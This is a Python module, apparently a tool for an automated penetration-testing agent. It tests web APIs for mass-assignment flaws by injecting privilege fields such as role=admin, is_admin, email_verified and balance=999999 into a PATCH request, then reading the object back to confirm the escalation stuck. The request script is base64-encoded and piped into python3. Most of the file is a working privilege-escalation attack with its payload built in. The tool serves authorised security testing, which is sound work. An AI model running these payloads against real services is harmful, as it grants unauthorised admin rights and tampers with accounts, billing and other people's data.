"""Mass-assignment primitive — add privileged fields to a write request and confirm they STICK.

The bug: an API binds the whole request body onto the model, so a field the UI never sends
(`role`, `is_admin`, `verified`, `email_verified`, `org_id`, `balance`, `is_staff`, `plan`) is
accepted and persisted. A sequential agent tends to test the fields it SEES; this systematically
injects the known privilege-escalation fields into a write and then RE-READS the object to prove
the value persisted (not just echoed) — the difference between a real finding and a guess.

Pure logic (analyze) is host-side + unit-tested; the HTTP is an in-sandbox stdlib script, so scope
+ rate still bind. State-changing, so it only writes the body the operator passes (plus the injected
fields) and reads back — it never deletes or touches another object.
"""
import base64
import json

# the classic privilege/trust fields APIs forget to strip from mass-bind. value chosen to be an
# obvious escalation the readback can confirm.
_DEFAULT_FIELDS = {
    "role": "admin", "is_admin": True, "isAdmin": True, "admin": True, "is_staff": True,
    "verified": True, "email_verified": True, "isVerified": True, "approved": True,
    "plan": "enterprise", "premium": True, "credit": 999999, "balance": 999999,
}


def analyze(readback_text: str, injected: dict) -> tuple:
    """Which injected fields persisted (name+value both present in the re-read object)? Returns
    (stuck:list, summary). Value match avoids flagging a field the object already had."""
    low = (readback_text or "")
    stuck = []
    for k, v in injected.items():
        vs = "true" if v is True else ("false" if v is False else str(v))
        # look for "key"...value proximity (JSON key then its value nearby)
        import re
        if re.search(re.escape(k) + r'"?\s*[:=]\s*"?' + re.escape(vs), low, re.I):
            stuck.append(f"{k}={vs}")
    if stuck:
        msg = ("MASS-ASSIGNMENT CONFIRMED — injected privileged field(s) persisted on read-back: "
               + ", ".join(stuck) + ". Prove the privilege it grants (e.g. the admin route now "
               "accepts you); do not further modify data.")
    else:
        msg = "no mass-assignment — none of the injected privileged fields persisted on read-back."
    return stuck, msg


def _script(params: dict) -> str:
    return "import json,urllib.request,urllib.error\n" + \
           f"P=json.loads(r'''{json.dumps(params)}''')\n" + r'''
def req(url,method,body,headers):
    r=urllib.request.Request(url,data=body.encode() if body else None,method=method)
    for k,v in (headers or {}).items(): r.add_header(k,v)
    if body and "content-type" not in {k.lower() for k in (headers or {})}:
        r.add_header("Content-Type","application/json")
    try:
        resp=urllib.request.urlopen(r,timeout=float(P.get("timeout",10)))
        return resp.getcode(), resp.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        try: b=e.read().decode("utf-8","replace")
        except Exception: b=""
        return e.code, b
    except Exception as ex:
        return None, "ERR:"+str(ex)[:80]
wst,wbody=req(P["url"],P.get("method","PATCH"),P["write_body"],P.get("headers",{}))
rst=rbody=None
if P.get("readback_url"):
    rst,rbody=req(P["readback_url"],"GET","",P.get("headers",{}))
print("MASSA_JSON:"+json.dumps({"write_status":wst,"write_body":wbody[:1500],
      "read_status":rst,"read_body":(rbody or "")[:2000]}))
'''


def _merge(base: str, fields: dict) -> str:
    try:
        obj = json.loads(base) if base else {}
        if not isinstance(obj, dict):
            obj = {}
    except Exception:
        obj = {}
    obj.update(fields)
    return json.dumps(obj)


def run(sb, args: dict) -> str:
    url = args.get("url") or ""
    if not url.startswith("http"):
        return "mass_assign error: 'url' must be an absolute http(s) write endpoint."
    fields = args.get("fields")
    if isinstance(fields, str) and fields.strip():
        try:
            fields = json.loads(fields)
        except Exception:
            fields = None
    if not isinstance(fields, dict) or not fields:
        fields = dict(_DEFAULT_FIELDS)
    headers = {}
    h = args.get("headers")
    if isinstance(h, dict):
        headers = {str(k): str(v) for k, v in h.items()}
    elif isinstance(h, str) and ":" in h:
        for line in h.replace("\\n", "\n").splitlines():
            if ":" in line:
                k, _, v = line.partition(":")
                headers[k.strip()] = v.strip()
    params = {"url": url, "method": (args.get("method") or "PATCH").upper(),
              "write_body": _merge(args.get("body") or "", fields),
              "readback_url": args.get("readback_url") or url,
              "headers": headers, "timeout": float(args.get("timeout") or 10)}
    b64 = base64.b64encode(_script(params).encode()).decode()
    out = sb.bash(f"echo {b64} | base64 -d | python3 -", timeout=90)
    payload = None
    for line in out.splitlines():
        if line.startswith("MASSA_JSON:"):
            try:
                payload = json.loads(line[len("MASSA_JSON:"):])
            except Exception:
                payload = None
    if payload is None:
        return "mass_assign: no result parsed — sandbox output:\n" + out[:500]
    readtext = payload.get("read_body") or payload.get("write_body") or ""
    stuck, msg = analyze(readtext, fields)
    head = (f"MASS_ASSIGN write={payload.get('write_status')} read={payload.get('read_status')} "
            f"injected {len(fields)} field(s)\n")
    return head + msg


def demo() -> None:
    inj = {"role": "admin", "is_admin": True, "plan": "enterprise"}
    # readback shows role=admin + is_admin true -> stuck; plan stayed 'free' -> not stuck
    rb = '{"id":7,"role":"admin","is_admin":true,"plan":"free","name":"x"}'
    stuck, msg = analyze(rb, inj)
    assert set(stuck) == {"role=admin", "is_admin=true"}, stuck
    assert "MASS-ASSIGNMENT CONFIRMED" in msg
    # nothing persisted
    assert analyze('{"role":"user","is_admin":false,"plan":"free"}', inj)[0] == []
    # merge adds fields onto a base body
    m = json.loads(_merge('{"name":"a"}', {"is_admin": True}))
    assert m["name"] == "a" and m["is_admin"] is True
    assert json.loads(_merge("", {"role": "admin"})) == {"role": "admin"}
    print("mass_assign.py ok")


if __name__ == "__main__":
    demo()
